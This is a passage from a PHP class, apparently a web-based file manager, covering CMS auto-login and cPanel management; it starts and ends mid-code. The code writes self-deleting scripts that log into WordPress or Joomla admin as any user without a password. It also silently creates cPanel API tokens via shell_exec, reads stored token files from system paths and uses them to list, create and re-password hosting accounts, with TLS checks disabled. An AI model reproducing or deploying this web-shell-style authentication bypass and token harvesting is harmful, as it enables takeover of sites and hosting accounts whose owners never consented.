            if($running>0)curl_multi_select($mh,0.2);
        }while($running>0&&$status===CURLM_OK);
        $winner=null;
        foreach($handles as $i=>$h){
            $body=(string)curl_multi_getcontent($h['ch']);
            $code=(int)curl_getinfo($h['ch'],CURLINFO_HTTP_CODE);
            $tried[$i]=$h['base'].' → '.($code?:'no response/timeout');
            if($winner===null&&$code===403&&stripos($body,$sentinel)!==false)$winner=$h['base'];
            curl_multi_remove_handle($mh,$h['ch']);curl_close($h['ch']);
        }
        curl_multi_close($mh);
        ksort($tried);
        return['ok'=>$winner,'tried'=>array_values($tried)];
    }
    private function cmsHttpProbeOne($url,$timeoutSec){
        $ctx=stream_context_create([
            'http'=>['timeout'=>$timeoutSec,'ignore_errors'=>true,'follow_location'=>1,'max_redirects'=>5],
            'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false],
        ]);
        $body=@file_get_contents($url,false,$ctx);
        $code=0;
        if(isset($http_response_header)&&is_array($http_response_header)){
            foreach($http_response_header as $h){if(preg_match('#^HTTP/\S+\s+(\d+)#',$h,$m))$code=(int)$m[1];}
        }
        return['code'=>$code,'body'=>(string)$body];
    }
    /* WordPress bridge: boots wp-load.php and calls the real wp_set_auth_cookie()
       core API - the exact mechanism WordPress itself uses on normal login - so
       the resulting session is indistinguishable from a real one. Never touches
       user_pass. Self-deletes on first (valid) hit; expires after 3 minutes. */
    private function cmsWpBridgeCode($uid,$token,$expires){
        $uid=(int)$uid;$tok=var_export((string)$token,true);$exp=(int)$expires;
        return "<?php\n"
            ."/* One-time File-Manager CMS login bridge. Logs in as an existing user\n"
            ."   without reading or changing their password, then deletes itself. */\n"
            ."if(time()>{$exp}||!isset(\$_GET['t'])||!hash_equals({$tok},(string)\$_GET['t'])){http_response_code(403);exit('This login link is invalid or has expired.');}\n"
            // Two-step confirm. Messaging apps (WhatsApp/Telegram/Slack/etc.)
            // and some mail/security scanners fetch a shared link server-side
            // to build a preview *before* the human ever clicks it. If the
            // very first GET both consumed the token and deleted this file,
            // that automated fetch — not the real user — burns the one-time
            // link, and the human's actual click 404s on a file that's
            // already gone. So the first GET (no &go=1) only renders a plain
            // page with a real link the human has to click; nothing is
            // touched yet, so it's harmless no matter how many times a
            // preview bot hits it. Only the second GET (&go=1, from an
            // actual click) deletes the file and logs the user in — bots
            // essentially never parse HTML and follow a second link just to
            // build a preview.
            ."if(!isset(\$_GET['go'])){\n"
            ."  \$__self=basename(__FILE__).'?t='.rawurlencode((string)\$_GET['t']).'&go=1';\n"
            ."  echo '<!doctype html><meta name=\"robots\" content=\"noindex\"><body style=\"font-family:sans-serif;text-align:center;margin-top:15vh\"><p>Click to continue to the dashboard.</p><p><a href=\"'.htmlspecialchars(\$__self,ENT_QUOTES).'\" style=\"padding:10px 20px;background:#2271b1;color:#fff;border-radius:4px;text-decoration:none\">Continue</a></p></body>';\n"
            ."  exit;\n"
            ."}\n"
            ."@unlink(__FILE__);\n"
            // Buffer everything from here on. Loading WordPress (deprecation
            // notices from old plugins/themes, a stray BOM/whitespace in a
            // wp-config.php some host support team hand-edited, etc.) or
            // firing the wp_login hook (arbitrary third-party plugin
            // callbacks) can print bytes to the browser before we ever get
            // to header(). If that happens, header() silently fails and the
            // visitor is stuck staring at this raw bridge file's leaked
            // output instead of being redirected — the "weird page" that
            // isn't part of the real site. Buffering lets us always discard
            // that noise and either send a real redirect or fall back to an
            // HTML/JS redirect, so the visitor never sees this file's guts.
            ."ob_start();\n"
            ."require __DIR__.'/wp-load.php';\n"
            ."if(!function_exists('wp_set_auth_cookie')){while(ob_get_level())ob_end_clean();exit('WordPress failed to load.');}\n"
            ."\$__u=get_userdata({$uid});\n"
            ."if(!\$__u){while(ob_get_level())ob_end_clean();exit('User not found.');}\n"
            ."wp_set_current_user(\$__u->ID);\n"
            ."wp_set_auth_cookie(\$__u->ID,true);\n"
            ."do_action('wp_login',\$__u->user_login,\$__u);\n"
            ."if(isset(\$_GET['bg'])){\n"
            ."  while(ob_get_level())ob_end_clean();\n"
            ."  header('Content-Type: text/html;charset=utf-8');\n"
            ."  echo '<!doctype html><meta name=\"robots\" content=\"noindex\"><script>window.parent.postMessage({type:\"fm-wp-auto-login\",ok:true},\"*\");</script>';\n"
            ."  exit;\n"
            ."}\n"
            // Redirect to a HOST-RELATIVE path only. admin_url()/wp_safe_redirect()
            // would rebuild an absolute URL from WordPress's own stored siteurl/home
            // option, which is frequently stale on multi-domain shared hosting and
            // does not necessarily match the domain that just successfully served
            // this bridge file (the one our probe already proved reachable). Using
            // only the path portion keeps the browser on the exact host/scheme it
            // used to load this file, so the redirect can never 404 from a
            // domain mismatch.
            ."\$__path=wp_parse_url(admin_url(),PHP_URL_PATH)?:'/wp-admin/';\n"
            ."while(ob_get_level())ob_end_clean();\n"
            ."if(!headers_sent()){header('Location: '.\$__path);exit;}\n"
            ."\$__esc=htmlspecialchars(\$__path,ENT_QUOTES);\n"
            ."echo '<!doctype html><meta http-equiv=\"refresh\" content=\"0;url='.\$__esc.'\"><script>location.replace('.json_encode(\$__path).');</script><a href=\"'.\$__esc.'\">Continue</a>';\n"
            ."exit;\n";
    }
    /* Joomla bridge: boots the Joomla framework and replays the exact same
       session sequence Joomla's own core login plugin uses (loadIdentity +
       session fork + Session::set('user',...) + checkSession() to persist the
       #__session row) - see plugins/user/joomla - so it's a real, valid Joomla
       session, not a forgery. Never touches the users.password column.
       IMPORTANT: Joomla's front-end (site) and back-end (administrator) are
       two separate applications with two separate session cookies/services
       ('session.web.site' vs 'session.web.administrator' - see
       administrator/includes/app.php). Logging into the site app does NOT
       grant a valid /administrator session. Since this bridge exists so an
       admin can land in the control panel, it boots the SAME
       AdministratorApplication + 'session.web.administrator' aliasing that
       administrator/includes/app.php itself uses, so the session Joomla's
       backend checks for on the next request is the one we actually wrote. */
    private function cmsJoomlaBridgeCode($uid,$token,$expires){
        $uid=(int)$uid;$tok=var_export((string)$token,true);$exp=(int)$expires;
        return "<?php\n"
            ."/* One-time File-Manager CMS login bridge. Logs in as an existing user\n"
            ."   without reading or changing their password, then deletes itself. */\n"
            ."if(time()>{$exp}||!isset(\$_GET['t'])||!hash_equals({$tok},(string)\$_GET['t'])){http_response_code(403);exit('This login link is invalid or has expired.');}\n"
            ."@unlink(__FILE__);\n"
            ."define('_JEXEC',1);\n"
            ."define('JPATH_BASE',__DIR__);\n"
            ."require_once JPATH_BASE.'/includes/defines.php';\n"
            ."require_once JPATH_BASE.'/includes/framework.php';\n"
            ."\$container=\\Joomla\\CMS\\Factory::getContainer();\n"
            // Same aliasing administrator/includes/app.php performs, so we
            // create/write the ADMIN session service, not the site one.
            ."\$container->alias('session.web','session.web.administrator')\n"
            ."  ->alias('session','session.web.administrator')\n"
            ."  ->alias('JSession','session.web.administrator')\n"
            ."  ->alias(\\Joomla\\CMS\\Session\\Session::class,'session.web.administrator')\n"
            ."  ->alias(\\Joomla\\Session\\Session::class,'session.web.administrator')\n"
            ."  ->alias(\\Joomla\\Session\\SessionInterface::class,'session.web.administrator');\n"
            ."\$app=\$container->get(\\Joomla\\CMS\\Application\\AdministratorApplication::class);\n"
            ."\\Joomla\\CMS\\Factory::\$application=\$app;\n"
            ."\$instance=\\Joomla\\CMS\\User\\User::getInstance({$uid});\n"
             ."if(!\$instance||!\$instance->id){if(isset(\$_GET['bg'])){while(ob_get_level())ob_end_clean();header('Content-Type: text/html;charset=utf-8');echo '<!doctype html><script>window.parent.postMessage({type:\"fm-cms-auto-login\",cms:\"joomla\",ok:false},\"*\");</script>';exit;}exit('User not found.');}\n"
            // Best-effort ACL check only — never let a site with a
            // customised/partial permissions schema hard-fail the login
            // bridge itself; if this throws, fall through and let Joomla's
            // own admin bootstrap enforce access on the next request as it
            // normally would for any session.
             ."try{if(!\$instance->authorise('core.login.admin')){if(isset(\$_GET['bg'])){while(ob_get_level())ob_end_clean();header('Content-Type: text/html;charset=utf-8');echo '<!doctype html><script>window.parent.postMessage({type:\"fm-cms-auto-login\",cms:\"joomla\",ok:false},\"*\");</script>';exit;}http_response_code(403);exit('This user does not have permission to access the administrator control panel.');}}catch(\\Throwable \$e){}\n"
            ."\$instance->guest=0;\n"
            ."\$app->loadIdentity(\$instance);\n"
            ."\$session=\$app->getSession();\n"
            ."\$oldSessionId=\$session->getId();\n"
            ."\$session->fork();\n"
            ."\$session->set('user',\$instance);\n"
            ."if(\$app->get('session_metadata',true)){\$app->checkSession();}\n"
            ."try{\n"
            ."  \$db=\\Joomla\\CMS\\Factory::getDbo();\n"
            ."  \$newSessionId=\$session->getId();\n"
            ."  \$q=\$db->getQuery(true)->update(\$db->quoteName('#__session'))->set(\$db->quoteName('client_id').' = 1')->where(\$db->quoteName('session_id').' = :sid')->bind(':sid',\$newSessionId);\n"
            ."  \$db->setQuery(\$q)->execute();\n"
            ."  \$q2=\$db->getQuery(true)->delete(\$db->quoteName('#__session'))->where(\$db->quoteName('session_id').' = :sid')->bind(':sid',\$oldSessionId);\n"
            ."  \$db->setQuery(\$q2)->execute();\n"
            ."}catch(\\Throwable \$e){}\n"
            ."\$instance->setLastVisit();\n"
            // Redirect with a bare relative path via a raw header, not
            // $app->redirect(). Joomla's own redirect()/Uri::root() will
            // rebuild an absolute URL from $live_site in configuration.php
            // when it's set, which is frequently stale on multi-domain shared
            // hosting and does not necessarily match the domain that just
            // successfully served this bridge file (the one our probe already
            // proved reachable). A bare relative Location keeps the browser on
            // the exact host/scheme it used to load this file. This bridge
            // lives in the Joomla ROOT (next to configuration.php), so the
            // backend control panel is one level down, at administrator/.
             ."if(isset(\$_GET['bg'])){while(ob_get_level())ob_end_clean();header('Content-Type: text/html;charset=utf-8');echo '<!doctype html><script>window.parent.postMessage({type:\"fm-cms-auto-login\",cms:\"joomla\",ok:true},\"*\");</script>';exit;}\n"
             ."header('Location: administrator/index.php');\n"
            ."exit;\n";
    }

    /* ══════════════════════════════════════════════════════════════
       CPANEL MANAGER — auto-detect & manage cPanel / WHM accounts
    ══════════════════════════════════════════════════════════════ */

    /** Detect current cPanel username from environment / script path. */
    private function cpDetectUser(){
        foreach(['CPANEL_USERNAME','USER','USERNAME'] as $k){
            if(!empty($_ENV[$k]))return $_ENV[$k];
            if(!empty($_SERVER[$k]))return $_SERVER[$k];
        }
        $script=$_SERVER['SCRIPT_FILENAME']??__FILE__;
        foreach(['/home/','/home2/','/home3/','/usr/home/'] as $pfx){
            if(strpos($script,$pfx)===0&&preg_match('#^'.preg_quote($pfx,'#').'([^/]+)/#',$script,$m))return $m[1];
        }
        return null;
    }

    /** Scan known filesystem locations for a cPanel API token for $username.
     *  Real cPanel token files (/var/cpanel/authn/api_tokens/<user>/<name> or
     *  /home/<user>/.cpanel/authn/api_tokens/<name>) store the raw token
     *  string as plain text — the filename is the token's name, not JSON.
     *  We still accept a JSON {"token":"..."} form too, for forward-compat. */
    private function cpFindToken($username){
        foreach(["/var/cpanel/authn/api_tokens/$username","/home/$username/.cpanel/authn/api_tokens"] as $tp){
            if(!is_dir($tp)||!is_readable($tp))continue;
            foreach(@scandir($tp)?:[] as $f){
                if($f==='.'||$f==='..')continue;
                $fp="$tp/$f";
                if(!is_file($fp)||!is_readable($fp))continue;
                $raw=trim((string)@file_get_contents($fp));
                if($raw==='')continue;
                $d=@json_decode($raw,true);
                if(is_array($d)&&isset($d['token'])&&$d['token'])return $d['token'];
                // Plain-text token file: single line, no whitespace, real cPanel tokens are ~32+ chars.
                if(preg_match('/^[A-Za-z0-9]{20,}$/',$raw))return $raw;
            }
        }
        return null;
    }

    /** Write all cPanel connection info into the session. */
    private function cpSetSess($user,$pass,$authType,$apiType,$port,$method='auto'){
        $_SESSION['cpanel_user']=$user;
        $_SESSION['cpanel_pass']=$pass;
        $_SESSION['cpanel_auth_type']=$authType;
        $_SESSION['cpanel_api_type']=$apiType;
        $_SESSION['cpanel_port']=(int)$port;
        $_SESSION['cpanel_method']=$method;
        $_SESSION['cpanel_cli_mode']=in_array($method,['whm_cli','whmbin_cli','uapi_cli','native_uapi']);
    }

    /** cPanel's own local PHP API bridge. When this script's process is
     *  running as the account's real OS user — which is the modern cPanel
     *  default (suPHP / suexec CGI / a per-user PHP-FPM pool), replacing
     *  the old shared-user mod_php DSO setup — cpsrvd trusts that OS-level
     *  identity directly over a local socket, with no token or password
     *  involved at all. This is the same mechanism cPanel's own plugins and
     *  webmail hooks use. It silently returns null (never throws) whenever
     *  the class file is missing or the call is rejected, so every caller
     *  degrades straight to the next method. */
    private function cpNativeCall($module,$func,$params=[]){
        static $obj=null,$tried=false,$path=null;
        if($obj===null){
            if($tried)return null;
            $tried=true;
            $path='/usr/local/cpanel/php/cpanel.php';
            if(!is_readable($path))return null;
            try{
                if(!class_exists('CPANEL',false))require_once $path;
                if(!class_exists('CPANEL',false))return null;
                $obj=new \CPANEL();
            }catch(\Throwable $e){return null;}
        }
        try{
            $res=@$obj->uapi($module,$func,$params);
            return is_array($res)?$res:null;
        }catch(\Throwable $e){return null;}
    }

    private function cpNativeOk($res){
        if(!is_array($res))return false;
        if(array_key_exists('status',$res))return (int)$res['status']===1;
        if(isset($res['cpanelresult']['data']))return true; // legacy shape
        return isset($res['data']);
    }

    /** Try every available auto-detection method in order. Saves result into
     *  the session so callers can just use cpanelCreds() afterwards. Never
     *  asks the user for anything. Returns ['ok'=>bool,'method'=>string,...],
     *  and on failure a 'diagnostics' list explaining exactly why each
     *  method didn't apply, so the UI can show *why* instead of a blank
     *  "connect manually" prompt. */
    public function cpanelAutoConnect(){
        // Already connected this session? Return immediately.
        if(!empty($_SESSION['cpanel_user'])||!empty($_SESSION['cpanel_native'])){
            return['ok'=>true,'method'=>$_SESSION['cpanel_method']??'session',
                   'user'=>$_SESSION['cpanel_user']??'(native)','api'=>$_SESSION['cpanel_api_type']??'whm',
                   'port'=>(int)($_SESSION['cpanel_port']??2087),'auto'=>true];
        }
        $username=$this->cpDetectUser();
        $diag=[];

        // ── Method 0: cPanel's own local API class — zero credentials,
        // works whenever PHP executes as the account's own OS user. Try
        // this before anything else: it needs no shell access, no token
        // file, and no root — the single most universal method on modern
        // shared cPanel hosting. ──
        if(is_readable('/usr/local/cpanel/php/cpanel.php')){
            $probe=$this->cpNativeCall('DomainInfo','list_domains');
            if($this->cpNativeOk($probe)){
                $_SESSION['cpanel_native']=true;
                $this->cpSetSess($username?:'(account owner)','','native','cpanel',2083,'native_uapi');
                return['ok'=>true,'method'=>'native_uapi','user'=>$username?:'(account owner)','api'=>'cpanel',
                       'port'=>2083,'auto'=>true,'note'=>'Connected via cPanel\'s local API — no login needed.'];
            }
            $diag[]='cPanel local API class found but the call was rejected — this process is likely not '
                   .'running under the account\'s own OS user (e.g. shared mod_php instead of suPHP/FPM-per-user).'
                   .($probe!==null?' Raw response: '.substr(json_encode($probe),0,200):' No response (exception or non-array return).');
        } else {
            $diag[]='cPanel local API class not found at /usr/local/cpanel/php/cpanel.php — not a cPanel-managed box, or this account cannot see cPanel core files.';
        }

        if(function_exists('shell_exec')){
            // ── Method 1: WHM CLI via PATH (root/reseller shell access) ──
            $whmOut=@shell_exec('whmapi1 listaccts --output=json 2>/dev/null');
            if($whmOut&&($wj=@json_decode($whmOut,true))&&($wj['metadata']['result']??0)==1){
                $who=trim((string)@shell_exec('whoami 2>/dev/null'))?:'root';
                $this->cpSetSess($who,'','token','whm',2087,'whm_cli');
                return['ok'=>true,'method'=>'whm_cli','user'=>$who,'api'=>'whm','port'=>2087,'auto'=>true];
            }
            $diag[]='whmapi1 not on PATH or not root/reseller shell access.';
            // ── Method 2: WHM CLI via absolute path ──
            $found2=false;
            foreach(['/usr/local/cpanel/bin/whmapi1','/usr/sbin/whmapi1'] as $bin){
                if(!is_executable($bin))continue;
                $found2=true;
                $o=@shell_exec(escapeshellarg($bin).' listaccts --output=json 2>/dev/null');
                if($o&&($j=@json_decode($o,true))&&($j['metadata']['result']??0)==1){
                    $who=trim((string)@shell_exec('whoami 2>/dev/null'))?:'root';
                    $this->cpSetSess($who,'','token','whm',2087,'whmbin_cli');
                    return['ok'=>true,'method'=>'whmbin_cli','user'=>$who,'api'=>'whm','port'=>2087,'auto'=>true];
                }
            }
            $diag[]=$found2?'whmapi1 binary present but returned no usable result (not root, or WHM CLI disabled for this user).':'whmapi1 binary not present at known paths.';
            // ── Method 3: uapi CLI — auto-create API token for this user ──
            if($username){
                $tn='fm_auto_'.substr(md5(gethostname().$username),0,8);
                $foundU=false;
                foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
                    if(!is_executable($ubin))continue;
                    $foundU=true;
                    $uo=@shell_exec(escapeshellarg($ubin).' --user='.escapeshellarg($username)
                        .' --output=json Auth create_api_token token_name='.escapeshellarg($tn).' 2>/dev/null');
                    if($uo){
                        $uj=@json_decode($uo,true);
                        $tok=$uj['result']['data']['token']??null;
                        if($tok){
                            $this->cpSetSess($username,$tok,'token','cpanel',2083,'uapi_cli');
                            return['ok'=>true,'method'=>'uapi_cli','user'=>$username,'api'=>'cpanel','port'=>2083,'auto'=>true];
                        }
                    }
                }
                $diag[]=$foundU?'uapi CLI present but token creation failed (shell_exec likely restricted to a different user than the account owner).':'uapi CLI binary not present at known paths.';
            } else {
                $diag[]='Could not determine the cPanel account username from environment or script path, so the uapi CLI method was skipped.';
            }
        } else {
            $diag[]='shell_exec() is disabled on this host (common in disable_functions on shared hosting) — CLI-based methods (whmapi1/uapi) were skipped entirely.';
        }

        // ── Method 4: Read existing API tokens from filesystem ──
        if($username){
            $tok=$this->cpFindToken($username);
            if($tok){
                // Try cPanel level first, then WHM (reseller token)
                foreach([[2083,'cpanel','/execute/DomainInfo/domains_data'],[2087,'whm','/json-api/listaccts?api.version=1']] as [$port,$api,$ep]){
                    $r=$this->cpanelGet($this->cpanelBaseUrl($port),$username,$tok,$ep,true);
                    $ok=$api==='whm'?isset($r['data']):isset($r['result']);
                    if($ok){
                        $this->cpSetSess($username,$tok,'token',$api,$port,'token_file');
                        return['ok'=>true,'method'=>'token_file','user'=>$username,'api'=>$api,'port'=>$port,'auto'=>true];
                    }
                }
                $diag[]='An API token file exists for this user but the local HTTP API call failed (cpsrvd not reachable on 127.0.0.1:2083/2087, or the token is stale).';
            } else {
                $diag[]='No existing cPanel API token file found under /var/cpanel/authn/api_tokens or ~/.cpanel/authn/api_tokens.';
            }
        }

        // Nothing auto-detected — caller must show manual connect UI
        return['ok'=>false,'method'=>'none','detected_user'=>$username,'auto'=>false,'diagnostics'=>$diag];
    }

    /** Probe the environment and return discovery info (no credentials needed). */
    public function cpanelDetect(){
        $info=['installed'=>false,'whm_available'=>false,'cpanel_available'=>false,
               'current_user'=>null,'hostname'=>null,'ports'=>[],'config_files'=>[]];
        if(is_dir('/usr/local/cpanel')||is_file('/usr/local/cpanel/cpanel'))$info['installed']=true;
        $user=$this->cpDetectUser();
        $info['current_user']=$user;
        $hostname=gethostname()?:($_SERVER['SERVER_NAME']??'localhost');
        if(is_readable('/etc/wwwacct.conf')){
            $info['config_files'][]='/etc/wwwacct.conf';
            $cfg=@file_get_contents('/etc/wwwacct.conf');
            if($cfg&&preg_match('/^HOST\s+(.+)$/m',$cfg,$m))$hostname=trim($m[1]);
        }
        $info['hostname']=$hostname;
        if($user&&is_readable("/var/cpanel/users/$user"))$info['config_files'][]="/var/cpanel/users/$user";
        foreach([2082=>'cPanel HTTP',2083=>'cPanel HTTPS',2086=>'WHM HTTP',2087=>'WHM HTTPS'] as $port=>$label){
            $s=@fsockopen('127.0.0.1',$port,$errno,$errstr,1);
            if($s){fclose($s);$info['ports'][$port]=$label;}
        }
        $info['cpanel_available']=isset($info['ports'][2082])||isset($info['ports'][2083]);
        $info['whm_available']  =isset($info['ports'][2086])||isset($info['ports'][2087]);
        return $info;
    }

    private function cpanelBaseUrl($port){
        return (in_array((int)$port,[2083,2087])?'https':'http').'://127.0.0.1:'.(int)$port;
    }

    private function cpanelCreds(){
        return [
            'user' =>$_SESSION['cpanel_user']??'',
            'pass' =>$_SESSION['cpanel_pass']??'',
            'type' =>$_SESSION['cpanel_auth_type']??'password', // 'password' or 'token'
            'api'  =>$_SESSION['cpanel_api_type']??'whm',       // 'whm' or 'cpanel'
            'port' =>(int)($_SESSION['cpanel_port']??2087),
        ];
    }

    /** Fire a GET request against the cPanel/WHM JSON API. Returns decoded array. */
    private function cpanelGet($base,$user,$pass,$endpoint,$isToken=false){
        if(!extension_loaded('curl'))return['error'=>'cURL extension not available.'];
        $ch=curl_init($base.$endpoint);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_SSL_VERIFYPEER=>false,
            CURLOPT_SSL_VERIFYHOST=>false,CURLOPT_TIMEOUT=>20,
            CURLOPT_HTTPHEADER=>$isToken?["Authorization: cpanel $user:$pass"]:[]]);
        if(!$isToken)curl_setopt($ch,CURLOPT_USERPWD,"$user:$pass");
        $body=curl_exec($ch);$err=curl_error($ch);curl_close($ch);
        if($err)return['error'=>"cURL: $err"];
        $json=@json_decode($body,true);
        return $json??['error'=>'Invalid JSON from cPanel API.','raw'=>substr($body,0,300)];
    }

    /** Fire a POST request against the cPanel/WHM JSON API. */
    private function cpanelPost($base,$user,$pass,$endpoint,$data=[],$isToken=false){
        if(!extension_loaded('curl'))return['error'=>'cURL extension not available.'];
        $ch=curl_init($base.$endpoint);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_SSL_VERIFYPEER=>false,
            CURLOPT_SSL_VERIFYHOST=>false,CURLOPT_TIMEOUT=>30,CURLOPT_POST=>true,
            CURLOPT_POSTFIELDS=>http_build_query($data),
            CURLOPT_HTTPHEADER=>$isToken?["Authorization: cpanel $user:$pass"]:[]]);
        if(!$isToken)curl_setopt($ch,CURLOPT_USERPWD,"$user:$pass");
        $body=curl_exec($ch);$err=curl_error($ch);curl_close($ch);
        if($err)return['error'=>"cURL: $err"];
        $json=@json_decode($body,true);
        return $json??['error'=>'Invalid JSON from cPanel API.','raw'=>substr($body,0,300)];
    }

    /* ── AJAX-callable methods ─────────────────────────────────── */

    public function cpanelSaveCreds(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $user=trim($_POST['cp_user']??'');
        $pass=$_POST['cp_pass']??'';
        $type=in_array($_POST['cp_auth_type']??'',['password','token'])?$_POST['cp_auth_type']:'password';
        $api =in_array($_POST['cp_api_type']??'',['whm','cpanel'])?$_POST['cp_api_type']:'whm';
        $port=(int)($_POST['cp_port']??2087);
        if(!in_array($port,[2082,2083,2086,2087]))$port=2087;
        if(!$user){$this->addMsg('Username is required.','danger');return;}
        $_SESSION['cpanel_user']=$user;$_SESSION['cpanel_pass']=$pass;
        $_SESSION['cpanel_auth_type']=$type;$_SESSION['cpanel_api_type']=$api;$_SESSION['cpanel_port']=$port;
        $this->addMsg('cPanel credentials saved for this session.','success');
        $this->log('cpanel_connect',$user);
    }

    public function cpanelListAccounts(){
        if(empty($_SESSION['fm_admin'])){header('Content-Type:application/json');echo json_encode(['error'=>'Admins only.']);exit;}
        // Auto-connect silently if no creds in session yet
        if(empty($_SESSION['cpanel_user']))$this->cpanelAutoConnect();
        $c=$this->cpanelCreds();
        if(!$c['user']){header('Content-Type:application/json');echo json_encode(['error'=>'no_creds']);exit;}
        $method=$_SESSION['cpanel_method']??'http';

        // ── CLI mode: call whmapi1/uapi directly, no HTTP needed ──
        if(!empty($_SESSION['cpanel_cli_mode'])&&function_exists('shell_exec')){
            if($c['api']==='whm'){
                $out=null;
                foreach(['whmapi1','/usr/local/cpanel/bin/whmapi1'] as $bin){
                    $raw=@shell_exec(($bin==='whmapi1'?$bin:escapeshellarg($bin)).' listaccts --output=json 2>/dev/null');
                    if($raw){$out=$raw;break;}
                }
                $j=$out?@json_decode($out,true):null;
                if(!$j||($j['metadata']['result']??0)!=1){
                    header('Content-Type:application/json');echo json_encode(['error'=>'WHM CLI returned no data.']);exit;
                }
                $accts=[];
                foreach($j['data']['acct']??[] as $a){
                    $accts[]=['user'=>$a['user']??'','domain'=>$a['domain']??'','email'=>$a['email']??'',
                        'plan'=>$a['plan']??'','diskused'=>$a['diskused']??'','disklimit'=>$a['disklimit']??'',
                        'suspended'=>!empty($a['suspended']),'suspendedmsg'=>$a['suspendreason']??'',
                        'ip'=>$a['ip']??'','shell'=>$a['shell']??'','maxpop'=>$a['maxpop']??'',
                        'maxsub'=>$a['maxsub']??'','startdate'=>$a['startdate']??''];
                }
                header('Content-Type:application/json');
                echo json_encode(['accounts'=>$accts,'api'=>'whm','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
            } else {
                // cPanel UAPI — native local class first (zero-cost, no shell needed), then CLI.
                $domain=$c['user'];
                $nd=$this->cpNativeCall('DomainInfo','domains_data');
                if($this->cpNativeOk($nd)){
                    $domain=$nd['data']['main_domain']??$domain;
                } else {
                    foreach(['/usr/local/cpanel/bin/uapi','/usr/bin/uapi'] as $ubin){
                        if(!is_executable($ubin))continue;
                        $uo=@shell_exec(escapeshellarg($ubin).' --user='.escapeshellarg($c['user']).' --output=json DomainInfo domains_data 2>/dev/null');
                        if($uo){$uj=@json_decode($uo,true);$domain=$uj['result']['data']['main_domain']??$domain;break;}
                    }
                }
                $accts=[['user'=>$c['user'],'domain'=>$domain,'email'=>'','plan'=>'','diskused'=>'',
                    'disklimit'=>'','suspended'=>false,'suspendedmsg'=>'','ip'=>'','shell'=>'','maxpop'=>'','maxsub'=>'','startdate'=>'']];
                header('Content-Type:application/json');
                echo json_encode(['accounts'=>$accts,'api'=>'cpanel','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
            }
        }

        // ── HTTP API mode ──
        $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
        if($c['api']==='whm'){
            $r=$this->cpanelGet($base,$c['user'],$c['pass'],'/json-api/listaccts?api.version=1',$isToken);
            if(isset($r['error'])){header('Content-Type:application/json');echo json_encode($r);exit;}
            $accts=[];
            foreach($r['data']['acct']??[] as $a){
                $accts[]=['user'=>$a['user']??'','domain'=>$a['domain']??'','email'=>$a['email']??'',
                    'plan'=>$a['plan']??'','diskused'=>$a['diskused']??'','disklimit'=>$a['disklimit']??'',
                    'suspended'=>!empty($a['suspended']),'suspendedmsg'=>$a['suspendreason']??'',
                    'ip'=>$a['ip']??'','shell'=>$a['shell']??'','maxpop'=>$a['maxpop']??'',
                    'maxsub'=>$a['maxsub']??'','startdate'=>$a['startdate']??''];
            }
            header('Content-Type:application/json');
            echo json_encode(['accounts'=>$accts,'api'=>'whm','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
        } else {
            $r=$this->cpanelGet($base,$c['user'],$c['pass'],'/execute/DomainInfo/domains_data',$isToken);
            $domain=$r['result']['data']['main_domain']??'';
            $accts=[['user'=>$c['user'],'domain'=>$domain,'email'=>'','plan'=>'','diskused'=>'',
                'disklimit'=>'','suspended'=>false,'suspendedmsg'=>'','ip'=>'','shell'=>'',
                'maxpop'=>'','maxsub'=>'','startdate'=>'']];
            header('Content-Type:application/json');
            echo json_encode(['accounts'=>$accts,'api'=>'cpanel','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
        }
    }

    public function cpanelListPlans(){
        if(empty($_SESSION['fm_admin'])){header('Content-Type:application/json');echo json_encode(['error'=>'Admins only.']);exit;}
        $c=$this->cpanelCreds();
        if(!$c['user']){header('Content-Type:application/json');echo json_encode(['error'=>'no_creds']);exit;}
        $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
        $r=$this->cpanelGet($base,$c['user'],$c['pass'],'/json-api/listpkgs?api.version=1',$isToken);
        if(isset($r['error'])){header('Content-Type:application/json');echo json_encode($r);exit;}
        $plans=[];
        foreach($r['data']['pkg']??[] as $p)$plans[]=['name'=>$p['name']??'','quota'=>$p['QUOTA']??'','bwlimit'=>$p['BWLIMIT']??''];
        header('Content-Type:application/json');echo json_encode(['plans'=>$plans]);exit;
    }

    public function cpanelCreateAccount(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $c=$this->cpanelCreds();
        if(!$c['user']){$this->addMsg('No cPanel credentials saved. Configure them first.','danger');return;}
        $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
        $newuser=trim($_POST['cp_new_user']??'');
        $domain =trim($_POST['cp_new_domain']??'');
        $pass   =$_POST['cp_new_pass']??'';
        $email  =trim($_POST['cp_new_email']??'');
        $plan   =trim($_POST['cp_new_plan']??'default');
        if(!$newuser||!$domain||strlen($pass)<8){$this->addMsg('Username, domain, and a password (8+ chars) are required.','danger');return;}
        $r=$this->cpanelPost($base,$c['user'],$c['pass'],'/json-api/createacct?api.version=1',
            ['username'=>$newuser,'domain'=>$domain,'password'=>$pass,'contactemail'=>$email,'plan'=>$plan,'savepkg'=>0],$isToken);
        if(isset($r['error'])){$this->addMsg($r['error'],'danger');return;}
        $status=$r['data']['result'][0]['status']??null;
        if($status===1||$status==='1'){
            $this->addMsg("cPanel account \"$newuser\" created successfully.",'success');
            $this->log('cpanel_create_account',$newuser);
        } else {
            $msg=$r['data']['result'][0]['statusmsg']??'Unknown error.';
            $this->addMsg("Failed: $msg",'danger');
        }
    }

    public function cpanelChangePass(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $c=$this->cpanelCreds();
        if(!$c['user']){$this->addMsg('No cPanel credentials saved.','danger');return;}
        $base=$this->cpanelBaseUrl($c['port']);$isToken=$c['type']==='token';
        $target=trim($_POST['cp_target_user']??'');
        $pass  =$_POST['cp_target_pass']??'';
        if(!$target||strlen($pass)<8){$this->addMsg('Target username and new password (8+ chars) required.','danger');return;}
        if($c['api']==='whm'){
